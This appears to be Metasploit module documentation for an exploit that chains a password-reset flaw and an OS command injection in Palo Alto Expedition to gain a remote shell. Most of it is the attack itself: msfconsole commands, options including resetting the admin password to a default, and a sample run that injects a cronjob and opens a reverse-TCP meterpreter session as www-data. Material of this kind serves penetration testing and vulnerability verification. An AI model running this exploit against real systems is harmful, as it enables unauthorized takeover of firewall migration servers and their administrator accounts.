## Vulnerable Application

This module exploits two vulnerabilities in Palo Alto Expedition to obtain a remote shell. The first vulnerability, CVE-2024-5910, allows to
reset the password of the admin user. The second vulnerability, CVE-2024-9464, is an authenticated OS command injection.

When credentials are provided, this module will only exploit the second vulnerability. If no credentials are provided, the module will
first try to reset the admin password and then perform the OS command injection. In a default installation, commands will get executed in
the context of www-data.

Note: If no credentials are available, the module will attempt to reset the admin password. For this, the parameter RESET_ADMIN_PASSWD must
explicitly be set to true.

## Testing

The software can be obtained from
[the vendor](https://live.paloaltonetworks.com/t5/expedition/ct-p/migration_tool).

Installation instructions are available [here]
(https://live.paloaltonetworks.com/t5/expedition-articles/expedition-documentation/ta-p/215619?attachment-id=13781).

**Successfully tested on**

- Expedition v1.2.91 on Ubuntu Server 20.04.1.

## Verification Steps

1. Install and run the application
2. Start `msfconsole` and run the following commands:

```
msf6 > msf6 > use exploit/linux/http/paloalto_expedition_rce 
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/paloalto_expedition_rce) > set RHOSTS <IP>
msf6 exploit(linux/http/paloalto_expedition_rce) > exploit
```

You should get a meterpreter session in the context of `www-data`.

## Options

### USERNAME
Username for authentication, if available.

### PASSWORD
Password for the associated user.
### WRITABLE_DIR
A writable location for the exploit to stage the command payload.

### RESET_ADMIN_PASSWD
If the username and password are not specified, the module will attempt to reset the admin password to the default password `paloalto`. This
is also done to authenticate and retrieve the exact version information, in case no credentials have been provided. As this alters the
configuration of the target system, the `RESET_ADMIN_PASSWD` parameter serves as a safeguard that must explicility set to true before the
reset endpoint is being invoked.

## Scenarios

Running the exploit against Expedition v1.2.91 on Ubuntu Server 20.04.1, using curl or wget as a fetch command, should result in an output
similar to the following:

```
msf6 exploit(linux/http/paloalto_expedition_rce) > exploit

[*] Started reverse TCP handler on 192.168.137.204:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Admin password successfully restored to default value paloalto (CVE-2024-5910).
[+] Successfully authenticated
[*] Version retrieved: 1.2.91
[*] Vulnerable to CVE-2024-5910 and appears to be vulnerable to CVE-2024-9464.
[+] The target appears to be vulnerable.
[*] Adding a new cronjob...
[*] Injecting OS command...
[*] Sending stage (3045380 bytes) to 192.168.137.203
[*] Meterpreter session 1 opened (192.168.137.204:4444 -> 192.168.137.203:49006) at 2024-10-13 19:30:10 -0400
[*] cleanup file: /tmp/j
[*] Check thy shell.

meterpreter > sysinfo 
Computer     : 192.168.137.203
OS           : Ubuntu 20.04 (Linux 5.4.0-42-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid 
Server username: www-data
meterpreter > 
```
